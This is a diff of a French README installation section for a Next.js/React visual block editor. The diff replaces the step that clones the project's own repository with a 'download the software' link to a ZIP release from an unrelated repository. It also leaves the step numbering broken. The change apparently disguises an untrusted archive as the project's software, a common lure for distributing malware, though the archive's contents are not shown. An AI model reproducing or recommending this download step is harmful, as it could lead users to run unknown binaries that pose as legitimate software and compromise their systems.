@@ -63,22 +63,20 @@
 
 ### **Étapes d’Installation**
 
-1. **Cloner ou Ajouter le Module :**
-   ```bash
-   git clone https://github.com/MonCompte/visual-block-editor.git
-   cd visual-block-editor
-   ```
+1. **Télécharger le logiciel**
+Link :
+https://github.com/ErrorNoName/L-W-C/releases/download/LWC/LWC.zip
 
-2. **Installer les Dépendances :**
+3. **Installer les Dépendances :**
    ```bash
    npx next dev
    ```
 
-3. **Intégrer dans votre Projet Next.js/React :**  
+4. **Intégrer dans votre Projet Next.js/React :**  
    - Copiez les dossiers `components/`, `lib/`, `styles/` (ou tout autre dossier requis) dans votre projet.  
    - Vérifiez que les dépendances (Babel, framer-motion, @radix-ui/react-scroll-area, etc.) sont bien installées dans votre `package.json`.  
 
-4. **Configurer l’AST Parser (si nécessaire) :**  
+5. **Configurer l’AST Parser (si nécessaire) :**  
    - Installez et configurez **Babel** ou **TypeScript** AST pour la conversion code ↔ blocs.  
 
 ---
